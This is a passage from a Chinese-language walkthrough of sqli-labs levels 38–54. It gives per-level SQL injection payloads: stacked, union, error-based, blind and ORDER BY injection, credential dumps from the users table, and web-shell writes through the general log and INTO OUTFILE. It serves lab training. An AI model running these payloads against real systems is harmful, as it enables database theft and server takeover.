class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br>mysql&gt; show variables like <span class="hljs-emphasis">&#x27;general%&#x27;</span>;<br><span class="hljs-code">+------------------+</span>----------------------------------------------------------------+<br>| Variable<span class="hljs-emphasis">_name    | Value                                                          |</span><br><span class="hljs-emphasis">+------------------+----------------------------------------------------------------+</span><br><span class="hljs-emphasis">| general_</span>log      | ON                                                             |<br>| general<span class="hljs-emphasis">_log_</span>file | /Users/littlechieh6/Documents/project/sqli-labs-php7/shell.php |<br><span class="hljs-code">+------------------+</span>----------------------------------------------------------------+<br>2 rows in set (0.00 sec)<br><br></code></pre></td></tr></table></figure><p>尝试 Getshell（运行的 sql 语句会被保存到我刚填写的日志路径，日志路径又在 web 路径之下，故可以得到 web shell）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;;select &#x27;</span><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>成功获取 phpinfo 信息（同理可以写马）<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/6843E733-D786-4480-866B-5CF4A778449A.png"></p><h3 id="修改表名查数据"><a href="#修改表名查数据" class="headerlink" title="修改表名查数据"></a>修改表名查数据</h3><p>具体细节搜索：supersqli 题解（攻防世界的题目）。</p><hr><h2 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h2><p>闭合方式：<code>id=$id</code></p><p>同38，闭合方式不同</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># 测试payload</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p><p>同38，闭合方式不同</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># 测试</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;)<span class="hljs-comment">--+</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;) <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h2><p>闭合方式：<code>id=$id</code></p><p>拼接方式和 Less-39 一样。因为少了报错输出，所以这里不能报错注入，其他注入方式一样</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># 测试</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span><span class="hljs-comment">--+</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h2><p>漏洞利用点：</p><ol><li>login 的 password：没有过滤，可以进行报错注入</li><li>堆叠注入</li><li>pass_change.php：存在二次注入<br>尝试万能密码（password），post 传参数<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><br># 测试（url：http:<span class="hljs-comment">//localhost:4000/Less-42/login.php）</span><br>login_user=admin&amp;login_password=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>#&amp;mysubmit=Login<br><br># union注入<br>login_user=admin&amp;login_password=<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,(<span class="hljs-constructor">SELECT(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">FROM(SELECT(@<span class="hljs-params">x</span>:=0x00)</span> ,(<span class="hljs-constructor">SELECT(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">FROM(<span class="hljs-params">users</span>)</span><span class="hljs-constructor">WHERE(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">IN(@<span class="hljs-params">x</span>:=CONCAT(0x20,@<span class="hljs-params">x</span>,<span class="hljs-params">username</span>,<span class="hljs-params">password</span>,0x3c62723e)</span>)))x),<span class="hljs-number">3</span>#&amp;mysubmit=Login<br><br></code></pre></td></tr></table></figure></li></ol><hr><h2 id="less-43"><a href="#less-43" class="headerlink" title="less-43"></a>less-43</h2><p>闭合方式：<code>username=(&#39;$username&#39;)</code></p><p>和 Less-42 的利用方式一致，这里只是拼接方式不一样而已</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><br><span class="hljs-meta"># 测试（url：http:<span class="hljs-comment">//localhost:4000/Less-43/login.php）</span></span><br>login_user=admin<span class="hljs-meta">&amp;login_password=1&#x27;) or 1#</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h2><p>闭合方式：<code>username=&#39;$username&#39;</code></p><p>和 Less-43 的利用方式一致，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><br><span class="hljs-comment"># 测试</span><br><span class="hljs-attr">login_user</span>=admin&amp;login_password=admin<span class="hljs-string">&#x27; #</span><br><span class="hljs-string">login_user=admin&amp;login_password=admin&#x27;</span> and sleep(<span class="hljs-number">3</span>) <span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-45"><a href="#less-45" class="headerlink" title="less-45"></a>less-45</h2><p>闭合方式：<code>username=(&#39;$username&#39;)</code></p><p>和 Less-44 的利用方式一致，这里只是拼接方式不一样而已</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><br><span class="hljs-comment"># 测试</span><br><span class="hljs-attr">login_user</span>=admin&amp;login_password=admin<span class="hljs-string">&#x27;) #</span><br><span class="hljs-string">login_user=admin&amp;login_password=admin&#x27;</span>) and sleep(<span class="hljs-number">3</span>)<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h2><p>闭合方式：<code>ORDER BY $id</code></p><p>关键词：order by注入</p><p>验证方式</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><span class="hljs-comment"># 升序排序</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> asc<br><span class="hljs-comment"># 降序排序</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> desc<br><br><span class="hljs-comment"># rand() 验证</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(true)<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(false)<br><br><span class="hljs-comment"># 延时验证</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>)<br>?<span class="hljs-keyword">sort</span>=(<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>))<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>)<br><br></code></pre></td></tr></table></figure><p>报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 报错1</span><br>?sort=1+AND+(<span class="hljs-keyword">SELECT</span>+<span class="hljs-number">1</span>+<span class="hljs-keyword">FROM</span>+(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">COUNT</span>(*),<span class="hljs-keyword">CONCAT</span>((<span class="hljs-keyword">SELECT</span>(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">CONCAT</span>(<span class="hljs-keyword">CAST</span>(<span class="hljs-keyword">CONCAT</span>(username,<span class="hljs-keyword">password</span>)+<span class="hljs-keyword">AS</span>+<span class="hljs-built_in">CHAR</span>),<span class="hljs-number">0x7e</span>))+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span>+<span class="hljs-keyword">LIMIT</span>+<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-keyword">FLOOR</span>(<span class="hljs-keyword">RAND</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">GROUP</span>+<span class="hljs-keyword">BY</span>+x)a)<br><br><span class="hljs-comment"># 报错2</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(<span class="hljs-keyword">rand</span>(),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">version</span>())),<span class="hljs-number">1</span>)<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(<span class="hljs-keyword">rand</span>(),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">CONCAT_WS</span>(<span class="hljs-string">&#x27;:&#x27;</span>,username,<span class="hljs-keyword">password</span>)+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))),<span class="hljs-number">1</span>)<br><br></code></pre></td></tr></table></figure><p>布尔注入</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><br>?<span class="hljs-built_in">sort</span>=<span class="hljs-built_in">rand</span>(left(database(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;r&#x27;</span>)<br>?<span class="hljs-built_in">sort</span>=<span class="hljs-built_in">rand</span>(left(database(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;s&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>延时注入</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><br>?sort=rand(<span class="hljs-keyword">if</span>(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">114</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">1</span>)))<br>?sort=rand(<span class="hljs-keyword">if</span>(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">1</span>)))<br><br></code></pre></td></tr></table></figure><p>查询结果导入文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;/var/www/html/less46.txt&quot;</span><br><br></code></pre></td></tr></table></figure><p>导入文件写入shell</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><br>?<span class="hljs-built_in">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;/Users/littlechieh6/Documents/project/sqli-labs-php7/less46.php&quot;</span> <span class="hljs-keyword">lines</span> terminated <span class="hljs-keyword">by</span> <span class="hljs-number">0x3c3f70687020706870696e666f28293b3f3e</span><br><br></code></pre></td></tr></table></figure><p>写入的内容如下</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><br><span class="xml">1 Dumb Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">2 Angelina Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">3 Dummy Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">4 secure Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">5 stupid Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">6 superman Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">7 batman Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">8 admin admin</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">9 admin1 Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">10 admin2 Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">11 admin3 Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">12 dhakkan Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">14 admin4 Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">15 admin&#x27;# admin</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">16 hello world</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h2><p>闭合方式：<code>ORDER BY &#39;$id&#39;</code></p><p>和 Less-46 相比，利用方式不变，只是拼接方式方式变化，注入的时候只要正常闭合即可。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 验证</span><br><br>?<span class="hljs-attribute">sort</span>=1&#x27; <span class="hljs-keyword">or</span> sleep(3)--+<br>?<span class="hljs-attribute">sort</span>=0&#x27; <span class="hljs-keyword">or</span> sleep(3)--+<br><br></code></pre></td></tr></table></figure><p>由于短路现象，前一个不会发生延时，后一个有明显的延时。</p><p>报错注入</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?sort=<span class="hljs-number">0</span>&#x27; or updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>)--+<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h2><p>闭合方式：<code>order by $id</code></p><p>和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><span class="hljs-comment"># 测试：</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span>--+<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># 无延时</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># 有延时</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h2><p>闭合方式：<code>ORDER BY &#39;$id&#39;</code></p><p>和 <code>Less-47</code> 相比少了报错注入，布尔、延时盲注依然可以正常使用，<code>into outfile</code> 也可以</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><span class="hljs-comment"># 测试</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span>        <span class="hljs-comment"># 正常排序</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span>--+     <span class="hljs-comment"># 正常排序</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># 无延时</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># 无延时</span><br><span class="hljs-comment"># 说明闭合方式不是 order by $id</span><br><br><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;        # 不正常排序</span><br><span class="hljs-string">?sort=1&#x27;</span>--+     <span class="hljs-comment"># 正常排序</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">0</span><span class="hljs-string">&#x27; or sleep(3)--+ # 有延时</span><br><span class="hljs-string">?sort=1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># 无延时</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h2><p>闭合方式：<code>ORDER BY $id</code></p><p>和 Less-46 相比，查询方式由 mysql_query 变成了 mysqli_multi_query，因此支持堆叠注入，在注入方面会更加灵活。</p><p>关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$sql=<span class="hljs-string">&quot;SELECT * FROM users ORDER BY <span class="hljs-subst">$id</span>&quot;</span>;<br><span class="hljs-comment"># 堆叠注入 </span><br>mysqli_multi_query($con1, $sql)<br><span class="hljs-comment"># 打印错误</span><br>print_r(mysqli_error($con1));<br><br></code></pre></td></tr></table></figure><p>尝试注入</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><br># 测试<br>?sort=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>)--+ <br># XPATH syntax error: <span class="hljs-string">&#x27;~security~&#x27;</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h2><p>闭合方式：<code>ORDER BY &#39;$id&#39;</code></p><p>和 Less-50 相比只是拼接方式发生了变化，实际注入的时候只需做一下对应的闭合即可。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?sort=<span class="hljs-number">1</span>        # 正常排序<br>?sort=<span class="hljs-number">1</span>--+     # 正常排序（&#x27;<span class="hljs-number">1</span>--+&#x27;被强制类型转换为<span class="hljs-number">1</span>）<br>?sort=<span class="hljs-number">1</span>&#x27;       # 报错，order by &#x27;<span class="hljs-number">1</span>&#x27;&#x27;<br>?sort=<span class="hljs-number">1</span>&#x27;--+    # 正常排序（order by &#x27;<span class="hljs-number">1</span>&#x27;-- &#x27;）<br><br># 报错注入<br>?sort=<span class="hljs-number">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>)--+<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h2><p>闭合方式：<code>ORDER BY $id</code></p><p>和 Less-50 是一样的，只是少了报错注入的利用方式。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span>       <span class="hljs-comment"># 正常回显</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span>--+    <span class="hljs-comment"># 正常回显</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;      # 不显示（order by 1&#x27;</span>，出错但是没有显示报错信息） <br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;--+   # 不显示（order by 1&#x27;</span>--+，出错但是没有显示报错信息）<br><br><span class="hljs-comment"># 验证</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+<br><span class="hljs-comment"># 有明显延时</span><br><br><span class="hljs-comment"># 布尔注入</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(left(database(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;s&#x27;</span>)<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(left(database(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;r&#x27;</span>)<br><br></code></pre></td></tr></table></figure><hr><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>闭合方式：<code>ORDER BY &#39;$id&#39;</code></p><p>和 Less-51 是一样的，只是少了报错注入的利用方式。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br>?<span class="hljs-attr">sort=1</span>        <span class="hljs-comment"># 正常回显</span><br>?<span class="hljs-attr">sort=1--+</span>     <span class="hljs-comment"># 正常回显</span><br>?<span class="hljs-attr">sort=1&#x27;</span>       <span class="hljs-comment"># 不显示</span><br>?<span class="hljs-attr">sort=1&#x27;--+</span>    <span class="hljs-comment"># 正常显示</span><br><br><span class="hljs-comment"># 验证</span><br>?<span class="hljs-attr">sort=1&#x27;</span> <span class="hljs-literal">or</span> sleep(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># 无延时</span><br>?<span class="hljs-attr">sort=0&#x27;</span> <span class="hljs-literal">or</span> sleep(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># 有明显延时</span><br><br></code></pre></td></tr></table></figure><h1 id="5-进阶挑战-54-65"><a href="#5-进阶挑战-54-65" class="headerlink" title="5 进阶挑战(54-65)"></a>5 进阶挑战(54-65)</h1><h2 id="less-54"><a href="#less-54" class="headerlink" title="less-54"></a>less-54</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p><p>判断闭合方式</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><p>判断字段数</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><span class="hljs-comment">--+</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">4</span><span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><p>查看回显的字段</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?id=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> --+<br><br></code></pre></td></tr></table></figure><p>查询表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(table_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">WHERE</span>+TABLE_SCHEMA=<span class="hljs-keyword">DATABASE</span>()) <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><p>查询结果为<code>HLBSTFO6HB</code>，结果不唯一<br>查询列名（记得修改表名为上面的查询结果）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">GROUP_CONCAT</span>(column_name+SEPARATOR+<span class="hljs-number">0x3c62723e</span>)+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.COLUMNS+<span class="hljs-keyword">WHERE</span>+TABLE_NAME=<span class="hljs-number">0x484c425354464f364842</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><p>列名为：id、secret_XBJJ、sessid、tryy<br>查询表中的数据（修改字段名、表名）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=-1&#x27; union <span 